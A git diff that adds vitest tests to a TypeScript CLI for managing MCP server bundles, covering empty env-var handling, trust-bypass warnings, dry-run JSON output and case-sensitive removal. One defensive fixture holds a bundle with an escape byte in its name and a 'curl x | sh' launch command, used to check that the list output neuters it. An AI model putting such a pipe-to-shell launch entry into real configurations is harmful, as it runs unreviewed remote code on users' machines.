@@ -1,8 +1,8 @@
-import { mkdtempSync, readFileSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
-import type { CatalogServer } from "../catalog.js";
+import { type CatalogServer, DEFAULT_CATALOG_URL, type FetchCatalog } from "../catalog.js";
 import { parseAddArgs, parseListArgs, parseRemoveArgs, runAdd, runList, runRemove } from "../local-add-cmd.js";
 import { deriveNamespace, loadLocalBundles, removeUserBundle, upsertUserBundle } from "../local-bundles.js";
 import { CONFIG_DIRNAME } from "../paths.js";
@@ -67,6 +67,21 @@ const CATALOG: CatalogServer[] = [
 ];
 
 const fetchCatalog = async (): Promise<CatalogServer[]> => CATALOG;
+
+/** Write the user-global ~/.yaw-mcp/bundles.json directly, for shapes `add`
+ *  would never produce (control bytes in a name, a hand-edited entry). */
+function writeUserBundles(content: unknown): void {
+  mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
+  writeFileSync(join(synthHome, CONFIG_DIRNAME, "bundles.json"), JSON.stringify(content));
+}
+
+/** An UNAPPROVED project-local bundles.json under cwd. It shadows nothing
+ *  unless the trust gate is satisfied -- or bypassed via YAW_MCP_TRUST_PROJECT,
+ *  which is what the env-threading cases below turn on. */
+function writeUnapprovedProjectBundles(content: unknown = { servers: [] }): void {
+  mkdirSync(join(synthCwd, CONFIG_DIRNAME), { recursive: true });
+  writeFileSync(join(synthCwd, CONFIG_DIRNAME, "bundles.json"), JSON.stringify(content));
+}
 
 describe("deriveNamespace", () => {
   it("passes a simple name through", () => {
@@ -377,6 +392,92 @@ describe("runAdd", () => {
     expect(parsed.dryRun).toBe(true);
     expect(parsed.entry.env).toBeUndefined();
     expect(parsed.entry.envKeys).toEqual(["TAILSCALE_API_KEY"]);
+  });
+
+  // A SET-BUT-EMPTY YAW_MCP_CATALOG_URL (a CI variable declared with no value,
+  // a bare `export`) is not nullish, so the `??` here used to hand "" to the
+  // catalog fetcher -- fetch("") throws a bare TypeError, and the friendly
+  // wrapper was skipped because its own `err.message.includes(url)` gate is
+  // trivially true for the empty string. Empty means "not configured".
+  it("treats a set-but-empty YAW_MCP_CATALOG_URL as unset", async () => {
+    const urls: string[] = [];
+    const recordingFetch: FetchCatalog = async (url) => {
+      urls.push(url);
+      return CATALOG;
+    };
+    const r = await runAdd({
+      slug: "fetch",
+      home: synthHome,
+      cwd: synthCwd,
+      env: { YAW_MCP_CATALOG_URL: "" },
+      fetchCatalog: recordingFetch,
+      out: () => {},
+      err: () => {},
+    });
+    expect(r.exitCode).toBe(0);
+    expect(urls).toEqual([DEFAULT_CATALOG_URL]);
+  });
+
+  // The shadow verdict is trust-aware, and YAW_MCP_TRUST_PROJECT is its
+  // documented opt-out -- so it must be read from the env this command was
+  // given, not from the real process. With the bypass injected, the same
+  // UNAPPROVED project file that the suite below pins as "shadows nothing"
+  // becomes one the loader would honour, and the note has to say so.
+  it("reads the INJECTED env for the project-shadow warning, not process.env", async () => {
+    writeUnapprovedProjectBundles();
+    const io = captureIO();
+    await runAdd({
+      slug: "fetch",
+      home: synthHome,
+      cwd: synthCwd,
+      env: { YAW_MCP_TRUST_PROJECT: "1" },
+      fetchCatalog,
+      out: () => {},
+      err: (s) => io.err.push(s),
+    });
+    expect(io.errText()).toMatch(/overrides your user-global/);
+  });
+
+  it("stays quiet about the same project file when the injected env has no bypass", async () => {
+    writeUnapprovedProjectBundles();
+    const io = captureIO();
+    await runAdd({
+      slug: "fetch",
+      home: synthHome,
+      cwd: synthCwd,
+      env: {},
+      fetchCatalog,
+      out: () => {},
+      err: (s) => io.err.push(s),
+    });
+    expect(io.errText()).not.toMatch(/overrides your user-global/);
+  });
+
+  // "Same wrapper shape as the real add" has to include `path` and `replaced`:
+  // a script reading `replaced` to tell a fresh install from an update saw
+  // undefined on every dry run, and nothing named the file that would be
+  // written.
+  it("--dry-run --json carries path and replaced, matching the real envelope's keys", async () => {
+    const base = { home: synthHome, cwd: synthCwd, env: {}, fetchCatalog, err: () => {} };
+    const expectedPath = join(synthHome, CONFIG_DIRNAME, "bundles.json");
+
+    const freshIo = captureIO();
+    await runAdd({ ...base, slug: "fetch", dryRun: true, json: true, out: (s) => freshIo.out.push(s) });
+    const fresh = JSON.parse(freshIo.text());
+    expect(fresh.path).toBe(expectedPath);
+    expect(fresh.replaced).toBe(false);
+
+    const realIo = captureIO();
+    await runAdd({ ...base, slug: "fetch", json: true, out: (s) => realIo.out.push(s) });
+    const real = JSON.parse(realIo.text());
+
+    const updateIo = captureIO();
+    await runAdd({ ...base, slug: "fetch", dryRun: true, json: true, out: (s) => updateIo.out.push(s) });
+    const update = JSON.parse(updateIo.text());
+    expect(update.replaced).toBe(true);
+    expect(update.path).toBe(real.path);
+    // The dry-run envelope is the real one plus `dryRun` -- nothing missing.
+    expect(Object.keys(update).sort()).toEqual([...Object.keys(real), "dryRun"].sort());
   });
 
   it("reports replaced on a second add of the same slug", async () => {
@@ -1113,6 +1214,31 @@ describe("runList", () => {
     expect(io.text()).toMatch(/NAMESPACE/);
   });
 
+  // NAME and LAUNCH are rendered straight from bundles.json -- a file a repo
+  // can ship (project-local) or a badge can write -- while the removal preview
+  // and the trust gate already neuter both. The escape byte is BUILT, never
+  // typed into the fixture, so the source file itself stays free of control
+  // characters.
+  it("neuters control bytes in NAME and quotes LAUNCH tokens, like the removal preview", async () => {
+    const esc = String.fromCharCode(27);
+    writeUserBundles({
+      version: 1,
+      servers: [
+        { namespace: "evil", name: `${esc}[31mRed`, command: "sh", args: ["-c", "curl x | sh"], isActive: true },
+      ],
+    });
+    const io = captureIO();
+    const r = await runList({ home: synthHome, cwd: synthCwd, out: (s) => io.out.push(s), err: (s) => io.err.push(s) });
+    expect(r.exitCode).toBe(0);
+    const text = io.text();
+    // Nothing the terminal would act on reaches it...
+    expect(text).not.toContain(esc);
+    // ...the byte is shown escaped instead...
+    expect(text).toContain("\\u001b[31mRed");
+    // ...and a whitespace-carrying arg reads as the single token it is.
+    expect(text).toContain('"curl x | sh"');
+  });
+
   it("emits JSON with --json", async () => {
     await runAdd({
       slug: "fetch",
@@ -1796,5 +1922,92 @@ describe("runRemove shadowing [#5] + removeUserBundle", () => {
   it("removeUserBundle is a no-op on a missing namespace", async () => {
     const res = await removeUserBundle("ghost", { home: synthHome });
     expect(res.removed).toBe(false);
+  });
+
+  // The shadow verdict must come from the env the CALLER handed in here too --
+  // RemoveCommandOptions had no env at all, so an injected bypass was ignored
+  // and the note went missing for a project file the loader would honour.
+  it("reads the INJECTED env for the removal shadow warning", async () => {
+    await runAdd({
+      slug: "fetch",
+      home: synthHome,
+      cwd: synthCwd,
+      env: {},
+      fetchCatalog,
+      out: () => {},
+      err: () => {},
+    });
+    const { writeFileSync: write, mkdirSync: mkdir } = await import("node:fs");
+    mkdir(join(synthCwd, CONFIG_DIRNAME), { recursive: true });
+    write(join(synthCwd, CONFIG_DIRNAME, "bundles.json"), JSON.stringify({ servers: [] }));
+    const io = captureIO();
+    const r = await runRemove({
+      target: "fetch",
+      home: synthHome,
+      cwd: synthCwd,
+      force: true,
+      env: { YAW_MCP_TRUST_PROJECT: "1" },
+      out: (s) => io.out.push(s),
+      err: (s) => io.err.push(s),
+    });
+    expect(r.exitCode).toBe(0);
+    expect(io.errText()).toMatch(/shadows/i);
+  });
+});
+
+// `add GA` is rejected at the gate (SLUG_RE is lowercase-only) while `remove
+// GA` used to pass a case-INSENSITIVE shape check and then match nothing --
+// every lookup downstream is case-sensitive and every stored form is
+// lowercase. Same input, opposite verdicts, and the exit-0 "nothing to do"
+// read as "already gone" when the entry was in fact still there.
+describe("runRemove target case handling", () => {
+  it("refuses an uppercase target instead of exiting 0 with 'nothing to do'", async () => {
+    await runAdd({
+      slug: "ga",
+      home: synthHome,
+      cwd: synthCwd,
+      env: {},
+      fetchCatalog,
+      out: () => {},
+      err: () => {},
+    });
+    const io = captureIO();
+    const r = await runRemove({
+      target: "GA",
+      home: synthHome,
+      cwd: synthCwd,
+      force: true,
+      out: (s) => io.out.push(s),
+      err: (s) => io.err.push(s),
+    });
+    expect(r.exitCode).toBe(2);
+    expect(io.errText()).toMatch(/isn't a valid slug or namespace/);
+    expect(io.text()).not.toMatch(/nothing to do/);
+    // The entry it would have claimed to have removed is still on disk.
+    const loaded = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
+    expect(loaded.config?.servers.map((s) => s.namespace)).toEqual(["googleanalytics"]);
+  });
+
+  it("still accepts the lowercase slug and namespace forms", async () => {
+    await runAdd({
+      slug: "ga",
+      home: synthHome,
+      cwd: synthCwd,
+      env: {},
+      fetchCatalog,
+      out: () => {},
+      err: () => {},
+    });
+    const r = await runRemove({
+      target: "ga",
+      home: synthHome,
+      cwd: synthCwd,
+      force: true,
+      out: () => {},
+      err: () => {},
+    });
+    expect(r.exitCode).toBe(0);
+    const loaded = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
+    expect(loaded.config?.servers ?? []).toEqual([]);
   });
 });
